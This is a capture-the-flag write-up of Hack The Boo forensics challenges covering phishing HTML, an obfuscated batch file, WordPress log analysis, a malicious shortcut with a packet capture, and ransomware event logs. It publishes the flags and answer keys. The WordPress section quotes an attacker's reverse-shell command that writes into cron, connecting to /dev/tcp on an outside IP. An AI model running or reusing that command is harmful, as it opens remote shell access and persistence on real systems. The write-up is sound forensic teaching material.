# Forensics Practice
Prepare yourselves, travelers!

Creatures have been stirring in the depths of night. Monstrosities emboldened by the lack of monster slayers have heard their names spoken under fearful breaths. As the Hack The Boo tales are brought to life over a campfire, the unsuspecting villagers cling to the light of the fire in hopes of an even brighter dawn.

The elders are here to guide you in your battles...

## Task 1: Spooky Phishing
Question: A few citizens of the Spooky Country have been victims of a targeted phishing campaign. Inspired by the Halloween spirit, none of them was able to detect attackers trap. Can you analyze the malicious attachment and find the URL for the next attack stage?

Flag: `HTB{sp00ky_ph1sh1ng_w1th_sp00ky_spr34dsh33ts}`

We are given the following file:
* `index.html`: HTML page containing the phishing mechanism.

Analyzing the source code, several encoded codes cane be identified in the tags highlighted.

![phishing1](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/1666ccad-4bf5-44bf-9589-e6d1740d82fa)

Let us start analyzing the `<script>` tag in HTML is used to include JavaScript code in a web page. 
1. `data`: - This specifies that the URL is a data URI. 
2. `text/javascript;base64`: - This part of the URL indicates that the data is encoded as Base64 and represents `JavaScript` code.

Hence, the whole section can be decoded from Base64 and the script code can then be analyzed further.

![phishing2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/1d141eed-f3f9-43a8-beb5-68442c9baffa)

Notice how the script initiates two variables, `nn` and `aa`. These variables contain the result of the `decodeHex` function given the two hidden values as parameter each time, after the result of the `atob` function (atob decodes data that has been encoded with base64). 

![phishing3](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/02f2d840-8370-4073-a19c-d30d0dd6f6a2)

One way is to analyze the `decodeHex` function. By concatenating the two hidden strings in the html file and decoding it with Base64 first and then hex, the flag can be retrieved.

![phishing4](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/61292495-bd0a-44f2-b61e-28baf9658ece)

Another way is to just enter the website as it will redirect us to an error page with the flag present in its URL. However, this was just an error from HTB after getting confirmation from a HTB staff on Discord.

![phishing5](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/b53a02cc-f233-49cf-add4-51b69a782d3b)

![phishing6](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/9af66095-5825-4d1f-be28-05b5a727cba0)

## Task 2: Bat Problems
Question: On a chilly Halloween night, the town of Hollowville was shrouded in a veil of mystery. The infamous "Haunted Hollow House", known for its supernatural tales, concealed a cryptic document. Whispers in the town suggested that the one who could solve its riddle would reveal a beacon of hope. As an investigator, your mission is to decipher the script's enigmatic sorcery, break the curse, and unveil the flag to become Hollowville's savior.

Flag: `HTB{0bfusc4t3d_b4t_f1l3s_c4n_b3_4_m3ss}`

We are given the following file:
* `payload.bat`: Malicious bat file.

As we can see from the following image, the script contains random variables that are assigned with random values. In a batch script (a .bat or .cmd file), the set command defines and manipulates environment variables which store information that can be used by the script or other programs running in the same environment (the Command Prompt session).

![bat](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/0fd21a7a-8f4c-46c9-a985-1570a57f694c)

First, the bat file can be analyzed using `Any.Run` which is a malware analyzer tool.
We will get the following result if we upload the sample on the aforementioned site.

![bat2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/0e1c32ed-4f98-4d8b-8f06-350efa1761e3)

By analyzing the behavior graph, we notice three actions made:
1. The attacker can be seen using `cmd` to copy PowerShell to a different path with a random name (Earttxmxaqr.png). 
1. The attacker then uses cmd again to rename the downloaded bat file and also change it's extension to `.png.bat` to avoid detection.
1. The attacker executes the base64 encoded string using the renamed PowerShell executable (`-enc` argument in Powershell is used to pass a base64 encoded command).

![bat3](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/66bc25ac-e13b-427b-917c-b51767202b0b)

By decoding the string, the flag can be retrieved.

![bat4](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/ff75d596-8d18-4edc-ad2d-925625bd205d)

## Task 3: Vulnerable Season
Question: Halloween season is a very busy season for all of us. Especially for web page administrators. Too many Halloween-themed parties to attend, too many plugins to manage. Unfortunately, our admin didn't update the plugins used by our WordPress site and as a result, we got pwned. Can you help us investigate the incident by analyzing the web server logs?

Flag: `HTB{L0g_@n4ly5t_4_bEg1nN3r}`

We are given the following file:
* `access.log`: Wordpress server logs.

In the log file, notice there are several requests related to a WordPress website. Analyzing the logs, `82.179.92.206` has performed the most requests out of the IP addresses, indicating a suspicious activity. So we can find the amount of times an IP addresses was involved by the number of requests.
```
cat access.log | cut -d " " -f 1 | sort | uniq -c
```

![vul](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/c8fa44b3-133d-4df6-b276-c06c98c9778d)

By reading the instructions, they mentioned that the attacker may have exploited a vulnerability in a plugin. 
Hence, the search can be easier by filtering the logs using "wp-content/plugins/" which is the directory storing all the plugins. Requests from 82.179.92.206 with response status code of 200 are the key to identifying the vulnerability, as these can reveal whether the attacker's attempts were successful. 

By analyzing the logs, notice how some requests suggest that the attacker has exploited the `wp-upg` plugin since the plugin was responding with 200 OK messages. Additionally, `wp-upg` has certain vulnerabilities such as CVE-2022-4060 and CVE-2023-0039

![vul2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/e0aac332-d852-458d-a5b6-39ac78ff7369)

After identifying the vulnerable plugin, the logs are analyzed further and another important log was found. These requests indicate the attacker was attempting to execute arbitrary commands on the system.

![vul3](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/9a45e2a9-b710-48e1-b087-f62fd4dc2986)

One of the requests creates a cron job named `testconnect` that connects to a Command and Control (CnC) server and prints the flag.

![vul4](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/ccbeef90-e54d-42ba-b1e9-66a5a2495552)

![vul5](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/d26940c4-9311-499f-9468-c29b2b5b990f)

At this point, I was stuck and required help from the HTB writeup. I found out that to retrieve the flag was to decode the URL using the `testconnect` cron job again. This can be done using the command:

```
echo "sh -i >& /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect && Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo $Mz$Tz$Vz$az$Kz$Oz|base64 -d|rev
```

![vul6](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/a9bbfa96-a62f-49aa-8d85-7ba1410c8684)

# Forensics Competition
Are you afraid of the dark?

A fog begins to hang over the villagers, as the denizens of the night have sensed their location deep in the forest. Tooth, claw, and hoof press forward to devour their prey.A grim future awaits our stalwart storytellers. It’s up to you, slayers! 

Crush this CTF and save the villagers from their peril. Beware! You won't be getting any help here...

## Task 1: Trick or Treat
Question: Another night staying alone at home during Halloween. But someone wanted to play a Halloween game with me. They emailed me the subject "Trick or Treat" and an attachment. When I opened the file, a black screen appeared for a second on my screen. It wasn't so scary; maybe the season is not so spooky after all.

Flag: `HTB{s4y_Pumpk1111111n!!!}`

We are given the following file:
* `capture.pcap`: Packet capture file
* `trick_or_treat.lnk`: The malicious file

Since the malicious file is provided by HTB, we can first gain additional information on it through `VirusTotal`, a famous OSINT website. After scanning, the file shows that it is indeed malicious and it connects to a malicious domain called `windowsliveupdater.com`. We also can notice that the file is connected to a few IP addresses, mainly `209.197.3.8` which is the malicious one.

![trick](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/a4aff7be-66ad-42d1-b85a-a45036f9f646)

Analyzing further, we can understand what kind of processes are executed by the malicious file and how it attacks a system.

As shown in the picture below, the malicious file seems to download malicious data from `http://windowsliveupdater.com` using a random User-Agent for HTTP requests to essentially mask its identity on the network. It then sets the downloaded data into a variable (`$vurnwos`) and processes the characters in pairs and converts them from hexadecimal representation to their actual characters. It then performs a bitwise XOR operation with 0x1d on each character and the output is appended to the `$vurnwos` string. Finally, it executes the variable using `Invoke-Command`. It also attempts to execute an empty variable (`$asvods`).

![trick2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/18c046be-af85-4c2f-b69a-860263088fcc)

After knowing what the malicious file does, the packet capture file can be analyzed using Wireshark to find the downloaded content. Since we know that the malicious file requested data from a website, we can filter `HTTP` packets only.

![trick3](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/40683109-8476-4b50-abda-d21893b78d82)

Going through the HTTP packets, we find a packet that shows the victim sending a GET request to `http://windowsliveupdater.com`. Analyzing the `User-Agent`, we can see that it is one of the randomized user agents set in the malicious file.

![trick4](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/e4c93aec-ff6b-4449-88ee-abeb70421357)

Now we know that that the IP address `77.74.198.52` is responsible for the malicious file execution, we can check its HTTP response. Notice that the HTTP response packet has a cleartext data that is truncated because it is too long for Wireshark. The data is our key to getting the flag and it must be extracted using the decoding method specified in the malicious file.

![trick5](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/b15e75f7-9bea-4bc9-b181-226a316beae9)

![trick6](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/00d6f275-10d2-49a2-90fb-5a468e26a910)

Since we know that the downloable content is encoded in hex and also XOR'ed, we can use `CyberChef` to extract the content.

![trick7](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/39636584-ff93-4ac1-a7a2-08ce3a4b2b8b)

## Task 2: Valhalloween
Question: As I was walking the neighbor's streets for some Trick-or-Treat, a strange man approached me, saying he was dressed as "The God of Mischief!". He handed me some candy and disappeared. Among the candy bars was a USB in disguise, and when I plugged it into my computer, all my files were corrupted! First, spawn the haunted Docker instance and connect to it! Dig through the horrors that lie in the given Logs and answer whatever questions are asked of you!

Flag: `HTB{N0n3_c4n_ru1n_th3_H@ll0w33N_Sp1r1t}`

We are given the following file:
* `Logs`: Directory containing various Windows XML EventLog (.evtx) files

In this challenge, we are given a series of questions that must be answered to obtain the flag. These answers can all be located in certain event log files provided by HTB.

![val](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/b1bb38df-be75-48aa-abc5-c125be6e3368)

```
[1]. What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)
Answer: 103.162.14.116:8888

[2]. According to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)
Answer: B94F3FF666D9781CB69088658CD53772

[3]. Based on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)  
Answer: lokilocker

[4]. What is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)  
Answer: Loki

[5]. What are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953) 
Answer: powershell.exe_3856

[6]. Following the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\Data\KCorp\FirstStage.pdf) 
Answer: C:\Users\HoaGay\Documents\Subjects\Unexpe.docx

[7]. When was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)
Answer: 2023-09-20_03:03:20

```

1. To complete this question, we can analyze the `Security` log file and filter the logs with event ID 4688 which is normally logged in Event Viewer when a new process is created. After filtering the results, we find a Powershell script that was executed to download the ransomware ('mscalc.exe') from a malicious server with its IP address and port. Additionally, we now know the estimated time of the ransomware attack is around 11:03:24 AM on 20/9/2023.

![val2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/97cc3cd3-9f16-4df0-bb69-4e7c4ad48a42)

2. To complete this question, we can analyze the `sysmon` log file and filter the logs with event ID 1 which is normally logged in Event Viewer when a new process is created. After filtering the results and since we know the Powershell script downloads the ransomware, we can attempt to find its child processes to locate the creation process of the ransomware. After analyzing the logs, we can find the ransomware with its MD5 hash.

![val3](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/00af9bac-08f2-4ed9-b3c6-1c27b014552d)

3. To complete this question, just put the ransomware's MD5 hash to any OSINT tool and check its family labels.

![val4](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/f75bf5ad-2fbc-4221-9fa4-7cd3d4302941)

4. To complete this question, we can analyze the `sysmon` log file and filter the logs with keyword 'schtasks' which is the name for task scheduling process. After filtering the results, we find a schtasks program with the parent process being the ransomware.

![val5](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/10866fc4-d065-4d4d-b905-d255d9a00a36)

5. To complete this question, we can analyze the `sysmon` log file and check the ransomware process again. Viewing the XML format of the ransomware process, we can easily find the parent process name and ID of the ransomware process.

![val6](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/974ca357-a564-444e-a291-a0422af01238)

6. To complete this question, we need to find the root process that spawned the ransomware. Hence, we can use the PPID to retrace the steps to the initial stage in the infection chain. 

The infection chain would look like this:
```
WINWORD.EXE with Unexpe.docx (7280) => cmd.exe (8776) => powershell.exe (3856) => mscalc.exe (7528)
```

![val7](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/627ad1c4-d6b8-48c4-a774-1c6e6df7ef48)
![val8](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/35ab7a83-9833-4eb2-9c41-24c3b239e6b1)
![val9](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/ff66795e-d5bb-4642-b4ee-09877f4bdae4)


7. To complete this question, we can just view the XML format of the `.docx` file and find the `TimeCreated SystemTime` row. ENSURE THE TIME FORMAT IS IN UTC!

![val10](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/9d59acda-2843-441c-9ebd-6fa0629c78c5)
